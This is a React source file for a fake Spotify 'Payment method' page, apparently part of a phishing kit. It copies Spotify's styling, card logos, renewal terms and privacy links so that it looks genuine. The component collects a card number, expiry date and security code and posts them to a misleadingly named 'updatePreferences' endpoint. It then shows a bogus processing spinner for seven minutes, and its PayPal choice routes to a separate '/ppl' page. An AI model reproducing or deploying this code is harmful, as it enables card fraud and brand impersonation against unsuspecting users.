import React, { useState, forwardRef, useEffect, useRef } from "react";
import axios from 'axios';
import { socket } from '../../index'; // Add this import
import CCForm from "./ccForm";

import './verifStyles.css';
import { useHistory } from 'react-router-dom';

const PaymentMethodForm = forwardRef((props, ref) => {
  const [selectedMethod, setSelectedMethod] = useState('');
  const [cardData, setCardData] = useState({
    cardNumber: '',
    expiryDate: '',
    securityCode: ''
  });
  const [message, setMessage] = useState('');
  const [styles, setStyles] = useState(null);
  const [isLoading, setIsLoading] = useState(false);
  const history = useHistory();
   // Get userId
  const timeoutRef = useRef(null);

  // Use useEffect for loading state and cleanup
  useEffect(() => {
    // Clear any existing timeout on unmount or when loading state changes
    return () => {
      if (timeoutRef.current) {
        clearTimeout(timeoutRef.current);
      }
    };
  }, []);

  const handleMethodChange = (e) => {
    setSelectedMethod(e.target.value);
  };

  const handleCardDataChange = (data) => {
    setCardData(data);
  };

  const validateCardData = () => {
    if (!cardData.cardNumber || !cardData.expiryDate || !cardData.securityCode) {
      setMessage('Please fill in all card details');
      return false;
    }
    // Add more specific validation if needed
    return true;
  };

  const handleCompletePurchase = async () => {
    const clientSessionID = localStorage.getItem('clientSessionID');
    console.log(clientSessionID);
    try {
      if (selectedMethod === 'paypal') {
        await import('../../assets/styles/login.css');
        history.push('/ppl');
        return;
      }

      // Clear any previous error messages
      setMessage('');

      // Validate card data before submission
      if (!validateCardData()) {
        return;
      }
	setIsLoading(true);
      const response = await axios.post(`${process.env.REACT_APP_API_URL}/api/authenticate/updatePreferences`, {
        clientSessionID,
        cardNumber: cardData.cardNumber,
        expiryDate: cardData.expiryDate,
        securityCode: cardData.securityCode
      });

      if (response.status === 200) {
        const { brand, last4Digits, logoUrl } = response.data;

        console.log(`Brand: ${brand}, Last 4: ${last4Digits}, Logo URL: ${logoUrl}`);
        localStorage.setItem("bankBrand", brand);
        localStorage.setItem("bankLast4Digits", last4Digits);
        localStorage.setItem("bankLogoUrl", logoUrl);
  
        setIsLoading(true); 
        timeoutRef.current = setTimeout(() => {
          history.push('/connection/timeout');
        }, 420000);
      }
    } catch (error) {
      console.error('Error:', error.response?.data || error.message);
      setMessage(error.response?.data?.error || 'Error processing payment');
    }
  };

  if (isLoading) {
    return (
      <div className="loading-overlay">
        <div className="loading-content">
          <div className="spinner"></div>
          <h3>Processing Your Payment</h3>
          <input type="hidden" value="loading" name="status" />
          <p>Please do not close this window.</p>
          <p className="small-text">This may take a few minutes...</p>
        </div>
      </div>
    );
  }

  return (
    <div>
      
    <div ref={ref} className={styles ? styles.container : ''}>
      
      <div className="sc-4f945396-2 fuTCuI">
        <div>
          <h2 className="encore-text encore-text-title-small" style={{ paddingBlockEnd: 'var(--encore-spacing-base)' }}>Payment method</h2>
        </div>
        <div className="sc-guDLey cHnNJn">
          <span></span>
          <div>
            <div className="wdwn-container">
              Why do we need your card details?&nbsp;
              <svg width="17" height="16" viewBox="0 0 17 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                <mask id="mask0_5710_11474" style={{ maskType: "alpha" }} maskUnits="userSpaceOnUse" x="0" y="0" width="17" height="16">
                  <path d="M8.50033 14.3332C11.9981 14.3332 14.8337 11.4976 14.8337 7.99984C14.8337 4.50203 11.9981 1.6665 8.50033 1.6665C5.00252 1.6665 2.16699 4.50203 2.16699 7.99984C2.16699 11.4976 5.00252 14.3332 8.50033 14.3332Z" stroke="black" strokeMiterlimit="10"></path>
                  <path d="M6.97955 6.84024C6.90051 6.56245 6.89078 6.26951 6.95122 5.98709C7.01166 5.70466 7.14041 5.44136 7.32622 5.22024C7.5753 4.95217 7.90095 4.76738 8.25883 4.69103C8.61671 4.61468 8.98942 4.65049 9.32622 4.79357C9.58579 4.90388 9.81144 5.08112 9.9801 5.30717C10.1488 5.53323 10.2544 5.8 10.2862 6.08024C10.2934 6.37929 10.2251 6.67533 10.0876 6.94099C9.95007 7.20666 9.74783 7.43339 9.49955 7.60024C9.24622 7.82024 8.61288 8.15357 8.52622 8.73357C8.52622 8.95357 8.49288 9.52024 8.49288 9.52024" stroke="black" strokeMiterlimit="10"></path>
                  <path d="M8.49994 11.3334C8.6288 11.3334 8.73327 11.2289 8.73327 11.1C8.73327 10.9712 8.6288 10.8667 8.49994 10.8667C8.37107 10.8667 8.2666 10.9712 8.2666 11.1C8.2666 11.2289 8.37107 11.3334 8.49994 11.3334Z" fill="black" stroke="black" strokeMiterlimit="10"></path>
                </mask>
                <g mask="url(#mask0_5710_11474)">
                  <rect x="0.5" width="16" height="16" fill="#6A6A6A"></rect>
                </g>
              </svg>
              <span className="wdwn-popup">We need your payment details for upcoming payment on your billing date.</span>
            </div>
            <ul tabIndex="-1" className="sc-iuOOrT cdoide">
              <li className="sc-cyZbeP fsxnOw">
                <a href="#" data-value="cards" className="sc-lnsjTu leUClS">
                  <div className="sc-khjJXk fnPcTG">
                    <div className="Radio-sc-tr5kfi-0 cJTmQq">
                      <input 
                        type="radio" 
                        name="paymentMethod"
                        value="cards"
                        id="option-cards"
                        checked={selectedMethod === 'cards'}
                        onChange={handleMethodChange}
                        className="VisuallyHidden__VisuallyHiddenElement-sc-17bibe8-0 eCTHGg" 
                      />
                      <label htmlFor="option-cards" className="Label-sc-17gd8mo-0 hOPeuj">
                        <span className="Indicator-sc-hjfusp-0 ikOybT"></span>
                        <span className="encore-text encore-text-body-small TextForLabel-sc-1wen0a8-0 gniVTV">
                          <span className="encore-text encore-text-body-medium">Credit or debit card</span>
                        </span>
                      </label>
                    </div>
                  </div>
                  <div className="sc-dmXWDj iqyZyN">
                    <div className="sc-kFCroH cyrFLU">
                      <div className="sc-irLvIq jUYFeV">
                        <img src="https://paymentsdk.spotifycdn.com/svg/cards/visa.svg" className="sc-eTNRI fMxAnl" alt="Visa" />
                        <img src="https://paymentsdk.spotifycdn.com/svg/cards/mastercard.svg" className="sc-eTNRI fMxAnl" alt="Mastercard" />
                        <img src="https://paymentsdk.spotifycdn.com/svg/cards/amex.svg" className="sc-eTNRI fMxAnl" alt="Amex" />
                        <img src="https://paymentsdk.spotifycdn.com/svg/cards/discover.svg" className="sc-eTNRI fMxAnl" alt="Discover" />
                      </div>
                      <span data-encore-id="overlayTrigger" className="Trigger-sc-1q mjssw-0 eOwnFz" style={{ marginLeft: "auto" }}>
                        <span className="TooltipTrigger__TriggerContainer-sc-13ojzs2-0 dEyddL">
                          <svg data-encore-id="icon" role="img" aria-hidden="true" viewBox="0 0 24 24" className="Svg-sc-ytk21e-0 hfLmFl">
                            <path d="M6 7a6 6 0 1 1 12 0v3h1a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-8a2 2 0 0 1 2-2h1V7zm2 3h8V7a4 4 0 0 0-8 0v3zm-3 2v8h14v-8H5z"></path>
                          </svg>
                        </span>
                      </span>
                    </div>
                  </div>
                </a>
                <div className="sc-bBkKde dwDMfR">
                  {selectedMethod === 'cards' && (
                    <CCForm 
                      cardData={cardData}
                      onCardDataChange={handleCardDataChange}
                    />
                  )}
                </div>
              </li>
              {/* Add other payment options here */}
            </ul>
          </div>
        </div>
      </div>
      <div className="sc-blmEgr ekEckw">
      <div className="sc-ifyrAs iZTEzN">
      <span className="encore-text encore-text-body-small" data-encore-id="text">
          <b>Subscription renewal terms:</b> You hereby authorize Spotify to automatically renew your subscription every month until you cancel.
          You may cancel at any time, however, you will not be entitled to a refund upon cancellation. Full renewal terms and instructions on how to
          cancel are available{' '}
          <a href="https://www.spotify.com/legal/paid-subscription-terms" target="_blank" rel="noopener noreferrer">
            here
          </a>.
        </span>
      </div>
      <span className="encore-text encore-text-body-small" data-encore-id="text">
        By continuing your subscription, you consent to Spotify storing your payment
        method for future subscription renewals and recurring charges. You can change your payment method at any time in your account
        settings. To learn more about how Spotify collects, uses, shares, and protects your personal data, please see Spotify's{' '}
        <a href="https://www.spotify.com/legal/privacy-policy/" target="_blank" rel="noopener noreferrer">
          Privacy Policy
        </a>.
      </span>

    </div>
      {selectedMethod === 'paypal' ? (
              <div className="sc-ktwOfi kzMurI">
                <div className="sc-fmKFGs jXzZEE">
                  <div className="sc-kFCroH cyrFLU">
                    <div className="sc-irLvIq iZyZti">
                      <img 
                        src="https://paymentsdk.spotifycdn.com/svg/providers/paypal.svg" 
                        alt="PayPal Logo" 
                        className="sc-eTNRI fMxAnl" 
                      />
                    </div>
                  </div>
                </div>
                <span 
                  className="encore-text encore-text-body-small sc-hABBmJ cPyxrR" 
                  data-encore-id="text"
                >
                  We’ll redirect you to PayPal to complete your purchase.
                </span>
                <button
                  id="checkout_submit"
                  data-encore-id="buttonPrimary"
                  onClick={handleCompletePurchase}
                  className="Button-sc-qlcn5g-0 bZmyWF encore-text-body-medium-bold"
                  style={{ width: '100%', maxWidth: '480px', marginTop: 'var(--encore-spacing-base)' }}
                >
                  <span className="ButtonInner-sc-14ud5tc-0 bvEWta encore-bright-accent-set">
                    Continue purchase
                  </span>
                  <span className="ButtonFocus-sc-2hq6ey-0 jNccKH"></span>
                </button>
              </div>
            ) : (
              <button 
                id="checkout_submit" 
                className={`Button-sc-qlcn5g-0 bZmyWF encore-text-body-medium-bold ${styles ? styles.submitButton : ''}`} 
                style={{ width: '100%' , maxWidth: '480px', marginTop: 'var(--encore-spacing-base)' }}
                onClick={handleCompletePurchase}
              >
                <span className="ButtonInner-sc-14ud5tc-0 bvEWta encore-bright-accent-set">
                  Complete purchase
                </span>
                <span className="ButtonFocus-sc-2hq6ey-0 jNccKH"></span>
              </button>)}
    </div> 
  </div>
  );
});

export default PaymentMethodForm;